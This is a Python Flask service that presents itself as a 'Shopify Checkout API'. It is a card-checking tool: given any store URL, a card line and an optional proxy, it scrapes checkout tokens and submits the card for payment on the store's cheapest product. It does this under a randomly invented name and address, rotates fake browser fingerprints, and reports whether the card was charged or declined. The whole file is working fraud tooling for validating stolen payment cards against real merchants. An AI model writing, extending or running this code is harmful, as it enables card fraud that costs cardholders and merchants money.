# -*- coding: utf-8 -*-
# Shopify Checkout API — Updated June 2026
# Supports all 66 PaymentErrorCode values from Shopify's current schema

import uuid
import requests
import random
import json
import time
import re
from urllib.parse import urlparse, parse_qs
from flask import Flask, request, jsonify

app = Flask(__name__)

# Updated Chrome UA strings (v130-133, June 2026)
_UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
]
_CH_UA_POOL = [
    '"Chromium";v="133", "Google Chrome";v="133", "Not-A.Brand";v="99"',
    '"Chromium";v="132", "Google Chrome";v="132", "Not-A.Brand";v="99"',
    '"Chromium";v="131", "Google Chrome";v="131", "Not-A.Brand";v="99"',
]
_PLATFORM_POOL = ['"Windows"', '"macOS"']

# All 66 PaymentErrorCode descriptions from Shopify's current schema
ERROR_DESCRIPTIONS = {
    "INCORRECT_NUMBER": "Card number does not comply with ISO/IEC 7812 numbering standard",
    "INVALID_NUMBER": "Card number was not matched by processor",
    "INVALID_EXPIRY_DATE": "Expiry date does not match correct formatting",
    "INVALID_CVC": "Security code does not match correct format (3-4 digits)",
    "EXPIRED_CARD": "Card number is expired",
    "INCORRECT_CVC": "Security code was not matched by the processor",
    "INCORRECT_ZIP": "Zip code is not in correct format",
    "INCORRECT_ADDRESS": "Billing address info was not matched by the processor",
    "INCORRECT_PIN": "Card PIN is incorrect",
    "NAME_MISMATCH": "Name on card and billing address don't match",
    "CARD_DECLINED": "Card number declined by processor",
    "PROCESSING_ERROR": "Processor error",
    "CALL_ISSUER": "Transaction requires voice authentication, call issuer",
    "PICK_UP_CARD": "Issuer requests that you pick up the card from the merchant",
    "CONFIG_ERROR": "Error in gateway or merchant configuration",
    "TEST_MODE_LIVE_CARD": "Card declined — request was in test mode, but used a non-test card",
    "UNSUPPORTED_FEATURE": "Gateway or merchant configuration does not support a feature used",
    "GENERIC_ERROR": "Unknown error during payment processing",
    "TRANSIENT_ERROR": "Infrastructure problem such as network or database connectivity",
    "GIFT_CARD_ERROR": "Error processing gift card payment",
    "REDEEMABLE_DISABLED": "The redeemable is disabled",
    "CUSTOM_REDEEMABLE_NO_LONGER_AVAILABLE": "Redeemable no longer available due to checkout change",
    "PAYMENT_METHOD_EXPIRED": "Payment method has expired",
    "AUTHENTICATION_ERROR": "Error during authentication",
    "AUTHORIZATION_ERROR": "Error during authorization",
    "UNKNOWN_PAYMENT_ERROR": "Unknown error during payment processing",
    "INVALID_PAYMENT_ERROR": "Invalid payment error during processing",
    "PUBLIC_PAYMENT_ERROR": "Payment could not be completed due to payment error",
    "UNPROCESSABLE_TRANSACTION": "Encountered an unprocessable transaction",
    "GATEWAY_NOT_ENABLED_ERROR": "Payment gateway is not enabled",
    "PAYPAL_RESTRICATED_ACCOUNT_GATEWAY": "Merchant's PayPal account is restricted",
    "MISSING_SHIPPING_ADDRESS": "Shipping address missing",
    "INVALID_SHIPPING_ADDRESS": "Shipping address is invalid",
    "FUNDING_ERROR": "Funding source failed",
    "UNILATERAL_AUTH_ERROR": "Unilateral accounts cannot do auth/capture, must do a sale",
    "INSUFFICIENT_FUNDS": "Customer account has insufficient funds",
    "INVALID_PAYMENT_METHOD": "Invalid payment method",
    "CANCELED_PAYPAL_BILLING_AGREEMENT": "PayPal billing agreement cancelled",
    "OFF_SESSION_REJECTED": "3DS off-session rejected",
    "AUTHENTICATION_REQUIRED": "Payment requires authentication",
    "TOKEN_EXPIRED": "Session expired — token no longer valid",
    "INVALID_TOKEN": "Token is invalid",
    "OAUTH_TOKEN_ERROR": "Unable to update OAuth token",
    "SUCCESSFUL_OFFSITE_WITH_GIFT_CARD_ERROR": "Offsite payment successful but gift card failed",
    "INVALID_BILLING_AGREEMENT_OR_TRANSACTION": "Billing agreement or transaction ID is invalid",
    "INVOICE_ALREADY_PAID": "Payment already made for this invoice",
    "INVALID_ITEM_TOTAL": "ItemTotal amount is not valid",
    "THIRD_PARTY_INTERNAL_ERROR": "Internal error on third party system",
    "INVALID_CURRENCY": "Transaction currency differs from previously specified",
    "CUSTOMER_NOT_FOUND": "Customer was not found",
    "CUSTOMER_IDENTIFIER_MISSING": "Customer identifier (email/phone) was missing",
    "AMOUNT_TOO_SMALL": "Transaction amount is too small",
    "PRE_CHARGE_ERROR": "Error validating payment information",
    "CONFIRMATION_REJECTED": "Shopify rejected the payment confirmation",
    "FRAUD_SUSPECTED": "Error that suggests fraud",
    "NO_ACCOUNT": "No account found for the payment provided",
    "INVALID_PURCHASE_TYPE": "Payment method not authorized for this purchase type",
    "PAYPAL_ERROR_GENERAL": "General PayPal error",
    "PAYMENT_ABOVE_THRESHOLD": "Payment amount above threshold for the region",
    "RISKY": "Payment rejected by risk control",
    "SHOP_PAY_DECLINED": "Payment declined by Shop Pay",
    "EXPIRED_BUYER_ACTION": "Buyer action has expired",
    "MOTO_TRANSACTIONS_BLOCKED": "MOTO transactions blocked for this merchant",
    "CANCELLED_PAYMENT": "Payment was cancelled",
    "CAPTCHA_REQUIRED": "Captcha required",
    "DECISION_RULE_BLOCK": "Declined due to decision rule block",
    "CVV_ATTEMPTS_EXCEEDED": "Too many failed CVV verification attempts",
    "INVALID_AMOUNT": "Amount too high or too low for provider",
    "INVALID_COUNTRY": "Payment method not available in customer's country",
    "PAYMENT_METHOD_UNAVAILABLE": "Payment method momentarily unavailable",
    "THREE_D_SECURE_FAILED": "3D Secure check failed",
}

def _rand_ua():       return random.choice(_UA_POOL)
def _rand_ch_ua():    return random.choice(_CH_UA_POOL)
def _rand_platform(): return random.choice(_PLATFORM_POOL)


class ShopifyChecker:
    # Updated SubmitForCompletion mutation
    SUBMIT_MUTATION = (
        "mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,"
        "$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,"
        "$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken "
        "metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult "
        "analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}"
        "...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}"
        "...on SubmitFailed{reason __typename}"
        "...on SubmitRejected{errors{...on NegotiationError{code localizedMessage __typename}"
        "...on PendingTermViolation{code localizedMessage nonLocalizedMessage __typename}__typename}__typename}"
        "...on Throttled{pollAfter pollUrl queueToken __typename}"
        "...on CheckpointDenied{redirectUrl __typename}"
        "...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}"
        "...on TooManyAttempts{__typename}"
        "...on TooManyRequests{__typename}"
        "__typename}}"
        "fragment ReceiptDetails on Receipt{"
        "...on ProcessedReceipt{id token redirectUrl orderIdentity{buyerIdentifier id __typename}__typename}"
        "...on ProcessingReceipt{id pollDelay __typename}"
        "...on ActionRequiredReceipt{id __typename}"
        "...on FailedReceipt{id processingError{...on PaymentFailed{code hasOffsitePaymentMethod __typename}__typename}__typename}"
        "...on WaitingReceipt{pollDelay __typename}"
        "...on ReceiptNotFound{__typename}"
        "__typename}"
    )

    # Updated PollForReceipt query
    POLL_QUERY = (
        "query PollForReceipt($receiptId:ID!,$sessionToken:String!){"
        "receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){"
        "...ReceiptDetails __typename}}"
        "fragment ReceiptDetails on Receipt{"
        "...on ProcessedReceipt{id token redirectUrl orderIdentity{buyerIdentifier id __typename}__typename}"
        "...on ProcessingReceipt{id pollDelay __typename}"
        "...on ActionRequiredReceipt{id action{"
        "...on CompletePaymentChallenge{offsiteRedirect url __typename}"
        "...on CompletePaymentChallengeV2{challengeType challengeData __typename}"
        "__typename}timeout{millisecondsRemaining __typename}__typename}"
        "...on FailedReceipt{id processingError{"
        "...on PaymentFailed{code hasOffsitePaymentMethod __typename}__typename}__typename}"
        "...on WaitingReceipt{pollDelay __typename}"
        "...on ReceiptNotFound{__typename}"
        "__typename}"
    )

    def __init__(self, base_url, proxy=None):
        self.session = requests.Session()
        if proxy:
            p = proxy if proxy.startswith(("http", "socks")) else f"http://{proxy}"
            self.session.proxies = {"http": p, "https": p}
        self.base_url = base_url.rstrip("/")
        if not self.base_url.startswith("http"):
            self.base_url = "https://" + self.base_url
        _ua = _rand_ua()
        _cua = _rand_ch_ua()
        _pf = _rand_platform()
        self.headers = {
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9",
            "priority": "u=1, i",
            "sec-ch-ua": _cua,
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": _pf,
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": _ua,
        }
        self.checkout_id = None
        self.variant_id = None
        self.product_id = None
        self.checkout_url = None
        self.session_token = None
        self.signature = None
        self.stable_id = None
        self.queue_token = None
        self.client_id = None
        self.visit_token = None
        self.shop_id = None
        self.cart_token = None
        self.payment_method_identifier = None
        self.signed_handles = []
        self.graphql_base = None
        self.build_id = None
        self.pci_build_hash = "a8e4a94"

    # ── helpers ──────────────────────────────────────────────────
    def _random_address(self):
        fn = random.choice(["James","Mary","Robert","Patricia","John","Jennifer","Michael","Linda","David","Susan"])
        ln = random.choice(["Smith","Jones","Taylor","Brown","Williams","Wilson","Johnson","Davies","Miller","Davis"])
        st = f"{random.randint(100,9999)} {random.choice(['Maple St','Oak Ave','Washington Blvd','Lakeview Dr','Park Way','Broadway','Elm St','Pine Ave'])}"
        city, state, zp = random.choice([("Los Angeles","CA","90001"),("New York","NY","10001"),("Houston","TX","77001"),("Miami","FL","33101"),("Chicago","IL","60601"),("Phoenix","AZ","85001"),("Seattle","WA","98101")])
        return {"firstName": fn, "lastName": ln, "address1": st, "city": city, "zoneCode": state, "postalCode": zp, "countryCode": "US", "phone": f"+1703{random.randint(210,999)}{random.randint(1000,9999)}"}

    # ── step 1: session ──────────────────────────────────────────
    def init_session(self):
        try:
            r = self.session.get(f"{self.base_url}/cart.js", headers=self.headers, timeout=15)
            if r.status_code not in (200, 302):
                return False
        except Exception:
            return False
        self.client_id = self.session.cookies.get("_shopify_y") or self.session.cookies.get("shopify_client_id") or str(uuid.uuid4())
        self.visit_token = self.session.cookies.get("_shopify_s") or str(uuid.uuid4())
        try:
            self.cart_token = r.json().get("token", "")
        except Exception:
            self.cart_token = ""
        return True

    # ── step 2: find product ─────────────────────────────────────
    def find_cheapest_product(self):
        try:
            r = self.session.get(f"{self.base_url}/products.json", headers=self.headers, timeout=15)
            products = r.json().get("products", [])
            best = None
            low = float("inf")
            for p in products:
                for v in p["variants"]:
                    if v.get("available") and float(v["price"]) < low:
                        low = float(v["price"])
                        best = v
                        self.product_id = p["id"]
            if best:
                self.variant_id = best["id"]
                return True
        except Exception:
            pass
        return False

    # ── step 3: add to cart ──────────────────────────────────────
    def add_to_cart(self):
        h = self.headers.copy()
        h.update({"content-type": "application/x-www-form-urlencoded; charset=UTF-8", "accept": "application/json, text/javascript, */*; q=0.01", "x-requested-with": "XMLHttpRequest", "origin": self.base_url})
        r = self.session.post(f"{self.base_url}/cart/add.js", data={"id": self.variant_id, "quantity": 1, "form_type": "product", "utf8": "\u2713"}, headers=h)
        if r.status_code == 200:
            self.cart_token = r.json().get("cart_token", self.cart_token)
            return True
        return False

    # ── step 4: telemetry (monorail) ─────────────────────────────
    def _monorail(self):
        url = f"{self.base_url}/.well-known/shopify/monorail/unstable/produce_batch"
        h = self.headers.copy()
        h.update({"content-type": "text/plain;charset=UTF-8", "origin": self.base_url, "priority": "u=4, i", "sec-fetch-mode": "no-cors"})
        now = int(time.time() * 1000)
        body = {"events": [{"schema_id": "storefront_customer_tracking/4.27", "payload": {"api_client_id": 580111, "event_id": f"sh-{str(uuid.uuid4()).upper()[:23]}", "event_name": "product_added_to_cart", "shop_id": int(self.shop_id or 0), "total_value": 47, "currency": "USD", "event_time": now, "event_source_url": self.checkout_url or self.base_url, "unique_token": self.client_id, "page_id": str(uuid.uuid4()).upper(), "source": "trekkie-storefront-renderer", "ccpa_enforced": True, "gdpr_enforced": False, "is_persistent_cookie": True, "analytics_allowed": True, "marketing_allowed": True, "sale_of_data_allowed": False, "preferences_allowed": True, "shopify_emitted": True}, "metadata": {"event_created_at_ms": now}}], "metadata": {"event_sent_at_ms": now}}
        try:
            self.session.post(url, data=json.dumps(body), headers=h, timeout=5)
        except Exception:
            pass

    # ── step 5: start checkout ───────────────────────────────────
    def start_checkout(self):
        h = self.headers.copy()
        h.update({"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "content-type": "application/x-www-form-urlencoded", "cache-control": "max-age=0", "origin": self.base_url, "referer": f"{self.base_url}/cart", "sec-fetch-dest": "document", "sec-fetch-mode": "navigate", "sec-fetch-user": "?1", "upgrade-insecure-requests": "1"})
        r = self.session.post(f"{self.base_url}/cart", data=f"updates%5B%5D=1&checkout=&cart_token={self.cart_token or ''}", headers=h, allow_redirects=True)
        self.checkout_url = r.url
        m = re.search(r"/checkouts/(?:cn/)?([a-zA-Z0-9]+)", self.checkout_url)
        if m:
            self.checkout_id = m.group(1)
            return True
        return False

    # ── step 6: extract checkout tokens ──────────────────────────
    def extract_tokens(self):
        h = self.headers.copy()
        h.update({"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "sec-fetch-dest": "document", "sec-fetch-mode": "navigate", "upgrade-insecure-requests": "1"})
        r = self.session.get(self.checkout_url, headers=h)
        html = r.text

        # Session token — try multiple patterns
        self.session_token = None
        for pat in [
            r'name="serialized-sessionToken"\s+content="&quot;([^"]+)&quot;"',
            r'"sessionToken"\s*:\s*"(AAEB[^"]+)"',
            r"'sessionToken'\s*:\s*'(AAEB[^']+)'",
            r'(AAEB[A-Za-z0-9_\-]{30,})',
        ]:
            m = re.search(pat, html)
            if m:
                self.session_token = m.group(1)
                break

        # Signature
        for pat in [
            r'"shopifyPaymentRequestIdentificationSignature"\s*:\s*"(eyJ[^"]+)"',
            r'"identificationSignature"\s*:\s*"(eyJ[^"]+)"',
            r'"paymentsSignature"\s*:\s*"(eyJ[^"]+)"',
            r'"signature"\s*:\s*"(eyJ[^"]+)"',
        ]:
            m = re.search(pat, html)
            if m:
                self.signature = m.group(1)
                break

        # Stable ID
        m = re.search(r'"stableId"\s*:\s*"([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})"', html)
        self.stable_id = m.group(1) if m else str(uuid.uuid4())

        # Queue token
        m = re.search(r'queueToken&quot;:&quot;([^&]+)&quot;', html) or re.search(r'"queueToken"\s*:\s*"([^"]+)"', html)
        self.queue_token = m.group(1) if m else None

        # Payment method identifier
        m = re.search(r'paymentMethodIdentifier&quot;:&quot;([^&]+)&quot;', html) or re.search(r'"paymentMethodIdentifier"\s*:\s*"([^"]+)"', html)
        self.payment_method_identifier = m.group(1) if m else None

        # Shop ID — try multiple patterns
        for pat in [r'"shopId"\s*:\s*(\d+)', r'shop_id[\s:=]+(\d+)', r'Shopify\.shop\s*=\s*"(\d+)"', r'"shop_id":\s*(\d+)']:
            m = re.search(pat, html)
            if m and m.group(1) != "0":
                self.shop_id = m.group(1)
                break
        if not self.shop_id:
            self.shop_id = "0"

        # Build ID
        m = re.search(r'"buildId"\s*:\s*"([a-f0-9]{40})"', html) or re.search(r'/build/([a-f0-9]{40})/', html)
        self.build_id = m.group(1) if m else "0000000000000000000000000000000000000000"

        # PCI build hash
        m = re.search(r'checkout\.pci\.shopifyinc\.com/build/([a-f0-9]+)/', html)
        self.pci_build_hash = m.group(1) if m else "a8e4a94"

        # Signed handles
        self.signed_handles = re.findall(r'"signedHandle"\s*:\s*"([^"]+)"', html)
        if not self.signed_handles:
            raw = re.findall(r'\\"signedHandle\\":\\"([^\\"]+)', html)
            self.signed_handles = [h.replace("\\n","").replace("\\r","") for h in raw]

        # GraphQL base
        parsed = urlparse(self.checkout_url)
        if "shopify.com" in parsed.netloc and "checkout." in parsed.netloc:
            self.graphql_base = f"{parsed.scheme}://{parsed.netloc}"
        else:
            self.graphql_base = self.base_url

        return bool(self.session_token)

    # ── step 7: vault card ───────────────────────────────────────
    def vault_card(self, cc_line):
        parts = cc_line.strip().split("|")
        if len(parts) != 4:
            return None, None
        card_num, month, year, cvv = [p.strip() for p in parts]
        addr = self._random_address()
        h = {
            "accept": "application/json",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/json",
            "origin": "https://checkout.pci.shopifyinc.com",
            "referer": f"https://checkout.pci.shopifyinc.com/build/{self.pci_build_hash}/number-ltr.html?identifier=&locationURL={self.checkout_url or ''}",
            "sec-ch-ua": self.headers["sec-ch-ua"],
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": self.headers["sec-ch-ua-platform"],
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": self.headers["user-agent"],
        }
        if self.signature:
            h["shopify-identification-signature"] = self.signature
        body = {
            "credit_card": {
                "number": card_num, "month": int(month), "year": int(year),
                "verification_value": cvv, "start_month": None, "start_year": None,
                "issue_number": "", "name": f"{addr['firstName']} {addr['lastName']}"
            },
            "payment_session_scope": urlparse(self.base_url).netloc,
        }
        r = self.session.post("https://checkout.pci.shopifyinc.com/sessions", json=body, headers=h, timeout=15)
        if r.status_code in (200, 201):
            return r.json().get("id"), addr
        return None, addr

    # ── step 8: submit for completion ────────────────────────────
    def submit(self, vault_id, addr, card_number=""):
        if not self.session_token:
            return None
        url = f"{self.graphql_base}/checkouts/unstable/graphql"
        h = self.headers.copy()
        h.update({
            "accept": "application/json",
            "content-type": "application/json",
            "origin": self.base_url,
            "referer": self.checkout_url,
            "shopify-checkout-client": "checkout-web/1.0",
            "shopify-checkout-source": f'id="{self.checkout_id}", type="cn"',
            "x-checkout-one-session-token": self.session_token,
            "x-checkout-web-deploy-stage": "production",
            "x-checkout-web-server-handling": "fast",
            "x-checkout-web-server-rendering": "yes",
            "x-checkout-web-source-id": self.checkout_id,
            "x-checkout-web-build-id": self.build_id,
        })

        raw_cc = card_number.replace(" ", "").replace("-", "")
        card_bin = raw_cc[:8] if len(raw_cc) >= 8 else raw_cc
        email = f"{addr['firstName'].lower()}{random.randint(10,99)}@gmail.com"
        attempt = f"{self.checkout_id}-uaz{''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=9))}"
        dl = [{"signedHandle": sh} for sh in self.signed_handles]
        sa = {"address1": addr["address1"], "address2": "", "city": addr["city"], "countryCode": "US", "postalCode": addr["postalCode"], "company": "", "firstName": addr["firstName"], "lastName": addr["lastName"], "zoneCode": addr["zoneCode"], "phone": addr["phone"]}

        payload = {
            "query": self.SUBMIT_MUTATION,
            "operationName": "SubmitForCompletion",
            "variables": {
                "attemptToken": attempt, "metafields": [],
                "analytics": {"requestUrl": self.checkout_url, "pageId": str(uuid.uuid4()).upper()},
                "input": {
                    "checkpointData": None,
                    "sessionInput": {"sessionToken": self.session_token},
                    "queueToken": self.queue_token,
                    "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                    "delivery": {"deliveryLines": [{"destination": {"streetAddress": {**sa, "oneTimeUse": False}}, "selectedDeliveryStrategy": {"deliveryStrategyMatchingConditions": {"estimatedTimeInTransit": {"any": True}, "shipments": {"any": True}}, "options": {"phone": addr["phone"]}}, "targetMerchandiseLines": {"lines": [{"stableId": self.stable_id}]}, "deliveryMethodTypes": ["SHIPPING"], "expectedTotalPrice": {"any": True}, "destinationChanged": True}], "noDeliveryRequired": [], "useProgressiveRates": False, "prefetchShippingRatesStrategy": None, "supportsSplitShipping": True},
                    "deliveryExpectations": {"deliveryExpectationLines": dl},
                    "merchandise": {"merchandiseLines": [{"stableId": self.stable_id, "merchandise": {"productVariantReference": {"id": f"gid://shopify/ProductVariantMerchandise/{self.variant_id}", "variantId": f"gid://shopify/ProductVariant/{self.variant_id}", "properties": [], "sellingPlanId": None, "sellingPlanDigest": None}}, "quantity": {"items": {"value": 1}}, "expectedTotalPrice": {"any": True}, "lineComponentsSource": None, "lineComponents": []}]},
                    "memberships": {"memberships": []},
                    "payment": {"totalAmount": {"any": True}, "paymentLines": [{"paymentMethod": {"directPaymentMethod": {"paymentMethodIdentifier": self.payment_method_identifier or vault_id, "sessionId": vault_id, "billingAddress": {"streetAddress": sa}, "cardSource": None}, "giftCardPaymentMethod": None, "redeemablePaymentMethod": None, "walletPaymentMethod": None, "walletsPlatformPaymentMethod": None, "localPaymentMethod": None, "paymentOnDeliveryMethod": None, "paymentOnDeliveryMethod2": None, "manualPaymentMethod": None, "customPaymentMethod": None, "offsitePaymentMethod": None, "customOnsitePaymentMethod": None, "deferredPaymentMethod": None, "customerCreditCardPaymentMethod": None, "paypalBillingAgreementPaymentMethod": None, "remotePaymentInstrument": None}, "amount": {"any": True}}], "billingAddress": {"streetAddress": sa}, "creditCardBin": card_bin},
                    "buyerIdentity": {"customer": {"presentmentCurrency": "USD", "countryCode": "US"}, "email": email, "emailChanged": False, "phoneCountryCode": "US", "marketingConsent": [{"sms": {"consentState": "DECLINED", "value": addr["phone"], "countryCode": "US"}}, {"email": {"consentState": "GRANTED", "value": email}}], "shopPayOptInPhone": {"number": addr["phone"], "countryCode": "US"}, "rememberMe": False, "setShippingAddressAsDefault": False},
                    "tip": {"tipLines": []},
                    "taxes": {"proposedAllocations": None, "proposedTotalAmount": {"any": True}, "proposedTotalIncludedAmount": None, "proposedMixedStateTotalAmount": None, "proposedExemptions": []},
                    "note": {"message": None, "customAttributes": []},
                    "localizationExtension": {"fields": []},
                    "shopPayArtifact": {"optIn": {"vaultEmail": "", "vaultPhone": addr["phone"], "optInSource": "REMEMBER_ME"}},
                    "nonNegotiableTerms": None,
                    "scriptFingerprint": {"signature": None, "signatureUuid": None, "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []},
                    "optionalDuties": {"buyerRefusesDuties": False},
                    "captcha": None, "cartMetafields": [],
                }
            },
        }

        for attempt_num in range(12):
            r = self.session.post(url, json=payload, headers=h)
            try:
                res = r.json()
            except Exception:
                return None
            if "errors" in res and res.get("data") is None:
                return None
            sub = res.get("data", {}).get("submitForCompletion", {})
            tn = sub.get("__typename", "")
            if tn in ("SubmitSuccess", "SubmitAlreadyAccepted", "SubmittedForCompletion"):
                return sub.get("receipt", {}).get("id")
            elif tn == "SubmitFailed":
                return None
            elif tn == "Throttled":
                self.queue_token = sub.get("queueToken", self.queue_token)
                payload["variables"]["input"]["queueToken"] = self.queue_token
                time.sleep(sub.get("pollAfter", 1000) / 1000.0)
            elif tn == "CheckpointDenied":
                return None
            elif tn in ("TooManyAttempts", "TooManyRequests"):
                return None
            elif tn == "SubmitRejected":
                codes = [e.get("code", "") for e in sub.get("errors", [])]
                if "WAITING_PENDING_TERMS" in codes:
                    time.sleep(0.5)
                    continue
                return None
            else:
                time.sleep(0.5)
                if attempt_num < 11:
                    continue
                return None
        return None

    # ── step 9: poll receipt ─────────────────────────────────────
    def poll_receipt(self, receipt_id):
        url = f"{self.graphql_base}/checkouts/unstable/graphql"
        h = self.headers.copy()
        h.update({
            "accept": "application/json",
            "content-type": "application/json",
            "referer": self.checkout_url,
            "shopify-checkout-client": "checkout-web/1.0",
            "shopify-checkout-source": f'id="{self.checkout_id}", type="cn"',
            "x-checkout-one-session-token": self.session_token,
            "x-checkout-web-deploy-stage": "production",
            "x-checkout-web-server-handling": "fast",
            "x-checkout-web-server-rendering": "no",
            "x-checkout-web-source-id": self.checkout_id,
            "x-checkout-web-build-id": self.build_id,
        })

        for i in range(15):
            try:
                r = self.session.post(url, json={
                    "query": self.POLL_QUERY,
                    "operationName": "PollForReceipt",
                    "variables": {"receiptId": receipt_id, "sessionToken": self.session_token},
                }, headers=h)
                receipt = r.json().get("data", {}).get("receipt", {})
                tn = receipt.get("__typename", "")

                if tn == "ProcessedReceipt" or "orderIdentity" in receipt:
                    order_id = receipt.get("orderIdentity", {}).get("id", "N/A")
                    return ("CHARGED", f"Order ID: {order_id}")

                elif tn == "FailedReceipt":
                    err = receipt.get("processingError", {})
                    code = err.get("code", "UNKNOWN")
                    desc = ERROR_DESCRIPTIONS.get(code, code)
                    return ("DECLINED", code, desc)

                elif tn == "ActionRequiredReceipt":
                    action = receipt.get("action", {})
                    action_url = action.get("url", "") or action.get("offsiteRedirect", "")
                    if action.get("challengeData"):
                        try:
                            cd = json.loads(action["challengeData"])
                            action_url = cd.get("acsUrl", "") or cd.get("url", "")
                        except Exception:
                            pass
                    return ("3DS_REQUIRED", action_url or "3DS challenge required")

                elif tn in ("ProcessingReceipt", "WaitingReceipt"):
                    delay = receipt.get("pollDelay", 2000)
                    time.sleep(delay / 1000.0)
                    continue

                elif tn == "ReceiptNotFound":
                    return ("ERROR", "RECEIPT_NOT_FOUND", "Receipt not found")

            except Exception:
                pass
            time.sleep(2)

        return ("ERROR", "TIMEOUT", "Polling timed out")

    # ── main check ───────────────────────────────────────────────
    def check_card(self, cc_line):
        if not self.init_session():
            return {"category": "ERROR", "code": "SESSION_INIT_FAILED", "detail": "Could not initialize session with the store"}
        if not self.find_cheapest_product():
            return {"category": "ERROR", "code": "NO_PRODUCT", "detail": "No available product found on the store"}
        if not self.add_to_cart():
            return {"category": "ERROR", "code": "CART_FAILED", "detail": "Failed to add product to cart"}
        self._monorail()
        try:
            self.session.get(f"{self.base_url}/cart", headers=self.headers, timeout=10)
            self.session.get(f"{self.base_url}/cart.js", headers=self.headers, timeout=10)
        except Exception:
            pass
        if not self.start_checkout():
            return {"category": "ERROR", "code": "CHECKOUT_FAILED", "detail": "Failed to start checkout process"}
        if not self.extract_tokens():
            return {"category": "ERROR", "code": "TOKEN_FAILED", "detail": "Failed to extract session tokens from checkout"}

        vault_id, addr = self.vault_card(cc_line)
        if not vault_id:
            return {"category": "ERROR", "code": "VAULT_FAILED", "detail": "Failed to vault card at payment processor"}

        cc_number = cc_line.split("|")[0].strip() if "|" in cc_line else ""
        receipt_id = self.submit(vault_id, addr, card_number=cc_number)

        if not receipt_id:
            return {"category": "DECLINED", "code": "SUBMISSION_REJECTED", "detail": "Payment submission was rejected before processing"}

        result = self.poll_receipt(receipt_id)
        if not result:
            return {"category": "ERROR", "code": "UNKNOWN", "detail": "Unknown error during polling"}

        if result[0] == "CHARGED":
            return {"category": "CHARGED", "code": "SUCCESS", "detail": result[1]}
        elif result[0] == "DECLINED":
            return {"category": "DECLINED", "code": result[1], "detail": result[2]}
        elif result[0] == "3DS_REQUIRED":
            return {"category": "3DS_REQUIRED", "code": "ACTION_REQUIRED", "detail": result[1]}
        else:
            return {"category": result[0], "code": result[1] if len(result) > 1 else "UNKNOWN", "detail": result[2] if len(result) > 2 else "Unknown"}


# ── Flask API ────────────────────────────────────────────────────

@app.route("/shopify", methods=["GET"])
def shopify_check():
    site = request.args.get("site")
    cc = request.args.get("cc")
    proxy = request.args.get("proxy")

    if not site or not cc:
        return jsonify({"status": "error", "message": "Missing required parameters. Usage: /shopify?site=<url>&cc=<num|mm|yyyy|cvv>&proxy=<optional>"}), 400

    try:
        checker = ShopifyChecker(base_url=site, proxy=proxy)
        result = checker.check_card(cc)
        return jsonify({
            "status": "success",
            "site": site,
            "cc": cc,
            "result": {
                "category": result["category"],
                "code": result["code"],
                "detail": result["detail"],
            },
        })
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
